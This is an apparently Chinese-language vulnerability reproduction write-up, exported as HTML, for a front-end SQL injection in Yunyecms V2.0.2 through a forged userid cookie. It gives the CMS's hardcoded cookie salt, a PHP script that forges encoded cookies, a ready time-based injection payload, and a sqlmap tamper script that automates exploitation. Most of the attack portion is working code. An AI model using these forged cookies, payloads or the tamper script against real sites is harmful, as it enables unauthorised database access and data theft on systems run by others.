<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="yunyecms-v202-前台注入漏洞二"><span class="csDE05BCC">Yunyecms V2.0.2 </span><span class="csECDA2D3">前台注入漏洞（二）</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">云业</span><span class="cs8926E06">CMS</span><span class="cs9C1B1871">内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">开源</span><span class="cs8926E06">CMS</span><span class="cs9C1B1871">，可用来快速建设一个品牌官网</span><span class="cs8926E06">(PC</span><span class="cs9C1B1871">，手机，微信都能访问</span><span class="cs8926E06">)</span><span class="cs9C1B1871">，后台功能强大，安全稳定，操作简单。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">yunyecms 2.0.2</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">问题出现在前台</span><span class="cs9FB05234">me***.php</span><span class="cs9C1B1871">文件中，自定义表单</span><span class="cs8926E06">customform</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">userid</span><span class="cs9C1B1871">从</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">中获取，截取一段数据包可以看到</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">的</span><span class="cs8926E06">userid</span><span class="cs9C1B1871">如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Yunyecms/Yunyecms%20V2.0.2%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%ef%bc%88%e4%ba%8c%ef%bc%89_files/image0.png" width="560" height="56" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">经过了加密处理，根据解密算法</span><span class="cs5BEC2C28">yunyecms_strdecode</span><span class="cs9C1B1871">可以在</span><span class="cs8926E06">corefun.php</span><span class="cs9C1B1871">找到对应的加解密算法</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Yunyecms/Yunyecms%20V2.0.2%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%ef%bc%88%e4%ba%8c%ef%bc%89_files/image1.png" width="560" height="140" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">里的</span><span class="cs8926E06">userid</span><span class="cs9C1B1871">可控因此我们根据算法流程我们可以在</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">中伪造</span><span class="cs8926E06">userid</span><span class="cs9C1B1871">值。还是用刚刚以上截取的</span><span class="cs8926E06">userid</span><span class="cs9C1B1871">测试。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Yunyecms/Yunyecms%20V2.0.2%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%ef%bc%88%e4%ba%8c%ef%bc%89_files/image2.png" width="560" height="39" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到真实的</span><span class="cs8926E06">userid</span><span class="cs9C1B1871">为</span><span class="cs8926E06">9</span><span class="cs9C1B1871">。构造一个</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">注入，生成如下</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Yunyecms/Yunyecms%20V2.0.2%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%ef%bc%88%e4%ba%8c%ef%bc%89_files/image3.png" width="560" height="114" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">YmM0OWM5ZWY1ODk5ZGRkNzM0T1NjZ1lXNWtJSE5zWldWd0tEVXA4ZDdlNzk5NTliNDQyYTI1ZDE0ZWUzODZmZDI4MzY5OTM0YQ==</span></p><p class="cs40DD2BC9"><span class="cs8926E06">payload</span><span class="cs9C1B1871">生成代码</span><span class="cs8926E06">front-test.php</span><span class="cs9C1B1871">为：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function yunyecms_strencode($string,$salt=&#39;~^y#u%n$y^e*c%m^s^~&#39;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return base64_encode(substr(md5($salt),8,18).base64_encode($string).substr(sha1($salt),0,35));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function yunyecms_strdecode($string,$salt=&#39;~^y#u%n$y^e*c%m^s^~&#39;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$retstr=base64_decode($string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$SHA1salt=substr(sha1($salt),0,35);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$md5salt=substr(md5($salt),8,18);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$retstr=substr($retstr,strlen($md5salt));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$retstr=substr($retstr,0,(strlen($retstr)-strlen($SHA1salt)));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return base64_decode($retstr);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if ($_GET[&#39;cookie&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string=$_GET[&#39;cookie&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$userid=yunyecms_strdecode($string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo $userid;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if($_GET[&#39;userid&#39;]){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string=$_GET[&#39;userid&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cookie=yunyecms_strencode($string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo $cookie;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续追溯可控的</span><span class="cs8926E06">userid,</span><span class="cs9C1B1871">可以看到</span><span class="cs8926E06">userid</span><span class="cs9C1B1871">经过步骤</span><span class="cs9FB05234">3-&gt;4-&gt;5</span><span class="cs9C1B1871">传递到了</span><span class="cs8926E06">pagelist</span><span class="cs9C1B1871">函数中</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Yunyecms/Yunyecms%20V2.0.2%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%ef%bc%88%e4%ba%8c%ef%bc%89_files/image4.png" width="560" height="426" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟入</span><span class="cs8926E06">pagelist</span><span class="cs9C1B1871">函数，将</span><span class="cs8926E06">$where</span><span class="cs9C1B1871">拼接到了</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">查询语句中</span><span class="cs8926E06">$sqlcnt,</span><span class="cs9C1B1871">然后交给了前几次</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">注入都出现的</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">查询函数</span><span class="cs5BEC2C28">GetCount</span><span class="cs9C1B1871">中。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Yunyecms/Yunyecms%20V2.0.2%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%ef%bc%88%e4%ba%8c%ef%bc%89_files/image5.png" width="560" height="104" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">详细查看下该函数，直接进行了</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">查询。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Yunyecms/Yunyecms%20V2.0.2%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%ef%bc%88%e4%ba%8c%ef%bc%89_files/image6.png" width="560" height="110" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">附上截</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Yunyecms/Yunyecms%20V2.0.2%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%ef%bc%88%e4%ba%8c%ef%bc%89_files/image7.png" width="560" height="293" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">手工有点麻烦，又想丢入</span><span class="cs8926E06">sqlmap</span><span class="cs9C1B1871">怎么办，由于</span><span class="cs8926E06">userid</span><span class="cs9C1B1871">经过了加密和编码处理，于是根据算法流程写一个</span><span class="cs8926E06">tamper</span><span class="cs9C1B1871">就可以很好的解决了，</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Yunyecms/Yunyecms%20V2.0.2%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%ef%bc%88%e4%ba%8c%ef%bc%89_files/image8.png" width="560" height="280" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">对应</span><span class="cs8926E06">tamper</span><span class="cs9C1B1871">的的脚本为</span></p><p class="cs3A447A38"><span class="cs9FB05234">yunyecms_front_sqli_tamp.py</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#!/usr/bin/env python</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">See the file &#39;LICENSE&#39; for copying permission</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import base64</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import hashlib</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from lib.core.enums import PRIORITY</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from lib.core.settings import UNICODE_ENCODING</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">__priority__ = PRIORITY.LOW</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def dependencies():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def md5(data):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;hash_md5 = hashlib.md5(data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;md5data=hash_md5.hexdigest()[8:18]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return md5data</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def sha1(data):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;string_sha1=hashlib.sha1(data).hexdigest()[0:35]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return string_sha1</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def yunyecms_strencode(string):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;salt=&#39;~^y#u%n$y^e*c%m^s^~&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return base64.b64encode(md5(salt)+base64.b64encode(string)+sha1(salt))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def tamper(payload, **kwargs):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Base64-encodes all characters in a given payload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&gt;&gt;&gt; tamper(&quot;1&#39; AND SLEEP(5)#&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;MScgQU5EIFNMRUVQKDUpIw==&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return yunyecms_strencode(payload) if payload else payload</span></p></body>
</html>
